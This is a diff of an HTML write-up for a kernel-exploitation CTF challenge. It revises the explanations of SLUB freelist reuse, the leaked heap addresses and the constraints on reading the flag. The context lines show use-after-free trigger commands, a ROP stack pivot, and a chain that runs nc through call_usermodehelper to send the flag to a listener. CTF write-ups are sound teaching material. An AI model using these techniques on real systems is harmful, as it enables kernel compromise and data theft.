@@ -189,7 +189,7 @@
           <h2>Challenge setup</h2>
           <p>You get <code>bzImage</code>, an unstripped <code>vmlinux</code>, an initramfs and three kernel modules — <code>nkrcu.ko</code>, <code>nkmon.ko</code>, <code>nknet.ko</code>. Linux 6.1.184, x86-64, one vCPU. The flag is at <code>/flag</code>, mode 0400, owned by root.</p>
           <p>The serial console drops to a <code>nobody</code> shell, but a player never reaches it — only TCP port 31337 is exposed.</p>
-          <p>The guest service is UDP, but the platform cannot expose a UDP port, so a small TCP front end bridges the two — <code>proxy.py</code> ships with the handout and reads the protocol's own <code>plen</code> to reframe the stream. Framing fields are network order, payload fields are native little-endian:</p>
+          <p>The guest service is UDP, but the deployment platform does not open UDP NodePorts, so a small TCP front end bridges the two — <code>proxy.py</code> ships with the handout and reads the protocol's own <code>plen</code> to reframe the stream. Framing fields are network order, payload fields are native little-endian:</p>
           <ul>
             <li>Request: <code>u32 magic | u8 ver | u8 cmd | u16 seq | u16 plen | u16 cksum | data[plen]</code></li>
             <li>Response: same header, <code>cmd</code> and <code>seq</code> echoed</li>
@@ -204,7 +204,7 @@
 | 0x06 | CMD_SPRAY_F | u64 kaddr    | int32                        |
 | 0x07 | CMD_SYNC    | -            | int32                        |</code></pre>
           <div class="note">
-            <code>CMD_CREATE</code> returns the descriptor's kernel heap address and <code>CMD_SPRAY_A</code> returns the address of every allocation it makes. That looks generous until you notice there is no attacker process inside the VM — no <code>mmap</code>, no <code>setxattr</code> spray, no <code>msg_msg</code>, no <code>pipe_buffer</code>. Without those two return values the bug is unexploitable.
+            <code>CMD_CREATE</code> returns the descriptor's kernel heap address and <code>CMD_SPRAY_A</code> returns the address of every allocation it makes. That looks generous until you notice there is no attacker process inside the VM — no <code>mmap</code>, no <code>setxattr</code> spray, no <code>msg_msg</code>, no <code>pipe_buffer</code>. Without those two return values the bug is effectively unexploitable.
           </div>
         </section>
 
@@ -329,7 +329,9 @@ kernel_base = kernel_fn - PRINTK_OFF</code></pre>
 
     if rop_kaddr == candidate:
         return str_kaddr, rop_kaddr</code></pre>
-          <p>Under SLUB's per-CPU LIFO freelist the object comes straight back. The guest still allocates on its own — skbs on the receive path for the very request being sent, plus workqueue and timer work — so the slot is occasionally taken first, hence the retry.</p>
+          <p>Under SLUB's per-CPU LIFO freelist the object comes straight back — provided it belonged to the slab the CPU is currently allocating from. If it did not, <code>kfree()</code> puts it on that slab's own freelist and the next <code>kmalloc(128)</code> hands back a different address.</p>
+          <p>That is what the loop absorbs. Real competition is negligible here: the guest is an idle busybox initramfs on one vCPU, and nothing on the packet path touches <code>kmalloc-128</code> — <code>struct sk_buff</code> comes from the unmergeable <code>skbuff_head_cache</code>, and any <code>__alloc_skb</code> head carries a 320-byte <code>skb_shared_info</code>.</p>
+          <p>The comments in the script below blame Docker and netfilter for the same thing. They are wrong twice over — the guest has netfilter compiled out, and host-side activity cannot reach the guest's freelists at all.</p>
           <p>Triggering the free is three commands in a fixed order:</p>
           <pre><code>send_cmd(CMD_SNAP,   p64(desc_id))   # nk_snaps[0].desc = desc_kaddr
 send_cmd(CMD_REMOVE, p64(desc_id))   # list_del_rcu + call_rcu
@@ -355,6 +357,7 @@ jmp __x86_indirect_thunk_rax                     ; rdi still = desc_kaddr
 nkrcu_pivot:  mov (%rdi),%rsp                    ; rsp = rop_kaddr
               ret                                ; first ROP entry</code></pre>
           <p>The tail jump means no argument shuffling. The pivot replaces <code>rsp</code> wholesale, abandoning the kworker stack.</p>
+          <p>What it lands on is a 128-byte slab object. <code>call_usermodehelper</code> then blocks in <code>UMH_WAIT_PROC</code> for the lifetime of <code>nc</code>, with its frames growing down past <code>rop_kaddr</code> into whatever neighbours it. That is survivable only because the box is about to panic anyway.</p>
           <pre><code>#!/usr/bin/env python3
 # NEPHILIM | DefCamp CTF 2026 | Kernel pwn | Insane
 #
@@ -671,7 +674,7 @@ if __name__ == "__main__":
           <p>The exploit never sees the flag — it arrives on the listener:</p>
           <pre><code>Connection received on 172.17.0.2 47352
 CTF{&lt;64 hex chars&gt;}</code></pre>
-          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, so the addresses differ from the run above:</p>
+          <p>Then <code>call_usermodehelper</code> returns, the final <code>ret</code> loads zero from <code>rop_kaddr+72</code>, and the box panics. Excerpted from an earlier boot, against an earlier kernel build, so both the addresses and the build counter differ from the run above:</p>
           <pre><code>[   19.591444] BUG: kernel NULL pointer dereference, address: 0000000000000000
 [   19.591459] #PF: supervisor instruction fetch in kernel mode
 [   19.591459] CPU: 0 PID: 40 Comm: kworker/0:2 Tainted: G           O       6.1.184 #1
@@ -704,8 +707,9 @@ CTF{&lt;64 hex chars&gt;}</code></pre>
           <p>Not in the API either. <code>out_len</code> is a destination capacity used as a lower bound, hardcoded to 40 by the caller. The <code>memcpy</code> length is the literal 40, and the source offset is always zero.</p>
           <p>The first 16 bytes are identity and state, leaving 24 bytes of payload per call. The flag is 69 characters, so it takes three reads.</p>
           <div class="note">
-            Because the read window cannot move, the paging has to happen on the write side. A solver cannot ask for bytes 24 to 47 of an object — only for bytes 0 to 39 of some object. Each page needs a fresh round of kernel execution, copying a different slice into the same fixed window, and the response carries no offset marker.
+            Because the read window cannot move, the paging has to happen on the write side. A solver cannot ask for bytes 24 to 47 of an object — only for bytes 0 to 39 of some object. Each page needs kernel execution that copies a different slice into the window, and the response carries no offset marker.
           </div>
+          <p>That also rules out the chain used above, which ends in a deliberate panic. Paging needs a chain that returns cleanly, so <code>nkmon</code> keeps firing every five seconds and the slot can be re-sprayed between ticks.</p>
           <p>During the CTF this surfaced as a team reporting a wrong flag. What they had was <code>CTF{</code> plus 20 hex characters — a correct prefix, truncated at the read boundary, with nothing in the reply to say so.</p>
           <p>Two constraints fall out of the code. The read target has to be a descriptor linked into <code>nk_list</code>, because <code>nk_find_desc_rcu</code> is the only lookup any command has — spray buffers are not in that list. And writing flag ASCII over <code>+16</code> destroys <code>ops</code>, so the read target must not be the snapshotted descriptor.</p>
         </section>
